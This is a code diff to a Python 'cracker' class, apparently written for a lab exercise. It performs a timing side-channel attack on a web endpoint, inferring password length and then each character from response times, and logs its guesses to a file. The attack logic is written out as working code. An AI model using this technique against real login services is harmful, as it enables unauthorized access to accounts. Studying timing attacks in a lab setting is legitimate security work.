@@ -10,38 +10,47 @@ import requests
 # logic: search for average highest duration
 # assumption: duration for the correct length is higher than for length for incorrect length
 
-class BasicCracker(Cracker):
+class ZvikaCracker(Cracker):
+    file = open("cracker_log.txt","w")  
 
     def find_pass_len(self,password_start_len=1):
-        checks = self.analize(password_start_len)
-        idx = 0
-        for report in checks:
-            if(report[1] == report[2] + 0.09):
-                break
-            idx += 1 
-        print(f"Password length found: {idx}")
-        return(idx)
+        self.analize(password_start_len)        
+        idx = self.checks.index(max(self.checks))
+            
+        print(f"Password length found: {idx -1}")
+        return idx -1
 
 
     def find_password(self,length):
         password = ""
+        is_max = True
         for j in range(length-1):
-            count = 0
+            print(j)
+            #count = 0
             checks = []
+            self.file.write('----------------start----------------\n\n')
             for i in range(len(self.POOL)):
                 url1 = self.url + '/' + (password + self.POOL[i]+"_"*(length-j-1))
                 print(f'checking for: {url1}')
-                checks.append(min(self.timeit(url1, 3)))
-                print(f'min time {checks[-1]}')
-                if checks[-1] < min(checks) + 0.09:
-                    print(checks[-1])
-                    count += 1
-                    if count > 1:
-                        i = i-1
-                        continue
-            password += self.POOL[checks.index(min(checks))]
-            print(password)
 
+                checks.append(min(self.timeit(url1, 3)))
+
+                print(f'time {checks[-1]}')
+                self.file.write(f'checking for: {url1}\n')
+                self.file.write(f'time {checks[-1]}\n')
+            if is_max:
+                password += self.POOL[checks.index(max(checks))]
+            else:
+                password += self.POOL[checks.index(min(checks))]
+            print(password)
+            if j%2 != 0:
+                is_max = not is_max
+            print("index - " + str(j))
+            print("is_max - " + str(is_max))
+
+        
+        self.file.write('----------------end----------------\n\n')
+            
         return password
 
 
@@ -52,5 +61,6 @@ class BasicCracker(Cracker):
             r = requests.get(url1, allow_redirects=True)
             if r.content == b'1':
                 print(f'password found: {str(password+i)}')
-                return str(password+i)
+                return [str(password+i),True]
+        return ["",False]
                 
